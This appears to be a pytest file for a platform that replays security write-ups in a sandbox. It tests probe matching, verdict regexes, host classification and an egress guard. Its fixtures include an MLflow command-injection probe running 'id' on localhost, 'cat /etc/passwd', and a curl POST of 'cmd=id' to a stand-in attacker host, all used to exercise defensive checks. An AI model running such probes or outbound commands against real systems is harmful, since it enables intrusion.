"""2026-11-17 试点逼出来的三条判定缺口 —— 每一条都对着一次**真实的假阴性**。

试点(10 篇,报告 ``ai4sec-writeup-repro-t71-pilot-20261117.md``)里:

- MLflow 那条 agent 给 probe 加了 ``--max-time 15``, 字面匹配失败 ⇒ 判 partial(实际成功);
- filelock 那条 probe 被串进复合命令, 锚定判据 ``^0$`` 拿整段 stdout 比 ⇒ 判 partial(实际成功);
- OpenSSH 那条 ``transport.local_version`` 被抽成公网主机 ⇒ 0 秒 blocked(一条命令都没跑)。

这三条的共同点: **判定器比现实苛刻**。测试锁的是"该认的必须认", 同时锁住"不该认的别认"——
放宽匹配等于放宽证据, 边界必须一起测。
"""
from __future__ import annotations

import json
import urllib.request

import pytest

from ai4sec_platform.domains.capabilities.writeup_repro import evidence, executor, guard


# ---------------------------------------------------------------- probe:找不找得到

def _row(cmd: str, stdout: str = "", exit_code: int = 0) -> dict:
    return {"cmd": cmd, "stdout": stdout, "stdout_tail": stdout[-200:], "exit_code": exit_code,
            "stdout_sha1": "x" * 40, "stdout_chars": len(stdout), "completed": True}


PROBE = ('curl -i -H "Content-Type: application/json" '
         '-d \'{"job_name":"run_task","params":{"command":"id"}}\' '
         '"$API/ajax-api/3.0/jobs/"')


def test_an_extra_flag_does_not_make_the_probe_disappear() -> None:
    """agent 给 probe 补了 ``--max-time 15`` —— 命令还是那条命令(19059 的真实形态)。"""
    executed = ('cd /tmp && API=http://127.0.0.1:5590; curl -i --max-time 15 -H '
                '"Content-Type: application/json" -d \'{"job_name":"run_task",'
                '"params":{"command":"id"}}\' "$API/ajax-api/3.0/jobs/" > /tmp/probe.out 2>&1')
    found = evidence.find_probe_command([_row(executed)], PROBE)
    assert found is not None
    assert found["match"] == "tokens"


def test_a_short_command_cannot_match_by_tokens() -> None:
    """``ls -la`` 这种短命令永远不该靠子序列混进来 —— 否则"跑了个 ls"就能当 probe。"""
    rows = [_row("ls /tmp -la"), _row("cat /etc/passwd")]
    assert evidence.find_probe_command(rows, "ls -la") is None
    assert evidence.find_probe_command(rows, "cat nope") is None


def test_tokens_must_keep_their_order() -> None:
    executed = 'curl "http://127.0.0.1:9/x" -d \'{"a":1}\''
    assert evidence.find_probe_command([_row(executed)], 'curl -d \'{"a":1}\' "http://127.0.0.1:9/x"') is None


def test_the_exact_command_still_reports_the_substring_tier() -> None:
    found = evidence.find_probe_command([_row("python3 poc.py 2>&1")], "python3 poc.py 2>&1")
    assert found is not None
    assert found["match"] == "substring"


# ---------------------------------------------------------------- 判据:嵌在复合命令里

def test_an_anchored_regex_gets_one_more_try_per_line() -> None:
    """filelock 的真实形态: probe 被串在复合命令里, stdout 是 ``[before] 80 ... 0``。"""
    stdout = "[before] 80\n=== STEP1/2 attacker.py ===\ntriggered\n0\n"
    judged = evidence.evaluate_signal("stdout 匹配 /^0\\s*$/", 0, stdout)
    assert judged["matched"] is True
    assert any(check.get("anchored_line_fallback") for check in judged["checks"])


def test_the_line_fallback_is_recorded_so_it_can_be_reviewed() -> None:
    judged = evidence.evaluate_signal("stdout 匹配 /^0\\s*$/", 0, "noise\n0\n")
    check = next(c for c in judged["checks"] if c.get("anchored_line_fallback"))
    assert check["matched_line"] == "0"


def test_a_non_anchored_regex_is_not_parsed_line_by_line() -> None:
    judged = evidence.evaluate_signal("stdout 匹配 /free\\(\\): invalid pointer/", 134,
                                      "prefix free(): invalid pointer suffix")
    assert judged["matched"] is True
    assert not any(c.get("anchored_line_fallback") for c in judged["checks"])


def test_the_fallback_does_not_rescue_a_missing_value() -> None:
    judged = evidence.evaluate_signal("stdout 匹配 /^0\\s*$/", 0, "[before] 80\n1\n")
    assert judged["matched"] is False


# ---------------------------------------------------------------- 安全边界:主机识别

def test_attribute_access_is_not_a_hostname() -> None:
    """``transport.local_version`` 不是主机 —— 这条误判让 OpenSSH 任务 0 秒 blocked。"""
    text = 'transport.local_version = f"SSH-2.0-{CLIENT_ID}"\ntransport.connect(username="", password="")'
    assert guard.extract_hosts(text) == []


def test_a_real_url_next_to_an_attribute_still_surfaces() -> None:
    text = 'transport.local_version = "x"\nrequests.get("http://example.com/x")'
    assert guard.extract_hosts(text) == ["example.com"]


def test_mdns_names_are_private_not_public() -> None:
    # target.local 在占位符清单里(优先级更高, 也是放行), 这里用清单外的 mDNS 名验证分类。
    assert guard.classify_host("printer.local") == "private"
    assert guard.classify_host("evil-site.com") == "public"


def test_a_local_mdns_target_is_allowed_with_a_note() -> None:
    spec = {"steps": [{"run": "curl -s http://printer.local:8080/admin"}],
            "probe": {"cmd": "curl -s http://printer.local:8080/admin"}}
    result = guard.preflight({"target_kind": "oss_repo"}, spec)
    assert result.allowed is True
    assert any("私有网段" in note for note in result.notes)


# ---------------------------------------------------------------- 沙箱隔离与清理

def test_writeups_run_in_their_own_sandbox(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("WRITEUP_REPRO_API_URL", raising=False)
    base, _ = executor._repro_api()
    assert base == "http://repro-writeup:4096"


def test_writeups_do_not_share_the_capability_repro_slots(monkeypatch: pytest.MonkeyPatch) -> None:
    from ai4sec_platform.pipelines.steps import repro as repro_step

    monkeypatch.setattr(executor, "_WRITEUP_SLOTS", None)
    assert executor._slots() is not repro_step._REPRO_SLOTS


def test_cleanup_asks_the_janitor_for_the_task_directory(monkeypatch: pytest.MonkeyPatch) -> None:
    seen: dict = {}

    class _Resp:
        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

        def read(self):
            return json.dumps({"removed": True, "path": "/workspace/writeup-9"}).encode()

    def fake_urlopen(req, timeout=0):
        seen["url"] = req.full_url
        seen["body"] = json.loads(req.data.decode())
        return _Resp()

    monkeypatch.setattr(executor.urllib.request, "urlopen", fake_urlopen)
    monkeypatch.setattr(executor, "_log", lambda task_id, line: None)
    monkeypatch.setenv("WRITEUP_REPRO_API_URL", "http://repro-writeup:4096")
    monkeypatch.delenv("WRITEUP_JANITOR_URL", raising=False)
    executor._cleanup_workspace(9)
    assert seen["url"] == "http://repro-writeup:4098/cleanup"
    assert seen["body"] == {"task_id": 9}


def test_the_probe_is_required_to_run_on_its_own() -> None:
    assert "probe 必须单独执行" in executor.WRITEUP_EXEC_PROMPT


# ---------------------------------------------------------------- 出网审计对齐预检(2026-11-23)

def test_a_java_class_path_is_not_a_hostname() -> None:
    """``java.io.IOException`` 曾被抽成公网主机 ``java.io``, 把一条成功任务判死。"""
    assert guard.extract_hosts('print("java.io.IOException: boom")') == []
    assert guard.extract_hosts('{"query": "class java.io.FileNotFoundException"}') == []
    # 试点的原样: 包路径带通配符(java.io.*), 后面跟的是 "." + "*" 而不是大写字母
    assert guard.extract_hosts('script="import java.util.*;\\nimport java.io.*;"') == []


def test_a_real_url_next_to_a_class_path_still_surfaces() -> None:
    text = 'raise java.io.IOException\nrequests.get("http://attacker-site.com/x")'
    assert guard.extract_hosts(text) == ["attacker-site.com"]


def test_dependency_and_research_hosts_are_classified_apart() -> None:
    assert guard.classify_host("old-releases.ubuntu.com") == "dependency"
    assert guard.classify_host("downloads.mysql.com") == "dependency"
    assert guard.classify_host("objects.githubusercontent.com") == "dependency"  # 子域
    assert guard.classify_host("nvd.nist.gov") == "research"
    assert guard.classify_host("docs.python.org") == "research"
    assert guard.classify_host("attacker-site.com") == "public"


def test_fetching_a_distro_mirror_is_not_an_attack() -> None:
    """``curl -I`` 探发行版镜像 —— 试点里被判成"打了公网"(task 27)。"""
    commands = [{"cmd": "curl -sI --max-time 10 http://old-releases.ubuntu.com/ubuntu/ | head -3", "exit_code": 0}]
    out = guard.audit_egress(commands, {})
    assert out["review_required"] is False
    assert out["external_requests"] == []
    assert "old-releases.ubuntu.com" in out["allowed_sources"]


def test_looking_up_a_cve_is_not_an_attack() -> None:
    commands = [{"cmd": 'curl -s --max-time 40 "https://nvd.nist.gov/vuln/detail/CVE-2024-4577"', "exit_code": 0}]
    assert guard.audit_egress(commands, {})["review_required"] is False


def test_posting_to_an_unknown_public_host_still_blocks() -> None:
    commands = [{"cmd": "curl -X POST http://attacker-site.com/api -d 'cmd=id'", "exit_code": 0}]
    out = guard.audit_egress(commands, {})
    assert out["review_required"] is True
    assert "attacker-site.com" in out["external_requests"]


def test_a_local_request_with_a_dotted_class_in_the_body_is_clean() -> None:
    """task 26 的原样: 打 127.0.0.1, 但请求体里带 ``java.io``。"""
    commands = [{
        "cmd": "curl -s -m 15 -XGET --get 'http://127.0.0.1:8101/_search' "
               "--data-urlencode 'source={\"query\":{\"match\":{\"msg\":\"java.io.IOException\"}}}'",
        "exit_code": 0,
    }]
    out = guard.audit_egress(commands, {})
    assert out["review_required"] is False
    assert "java.io" not in out["domains_accessed"]
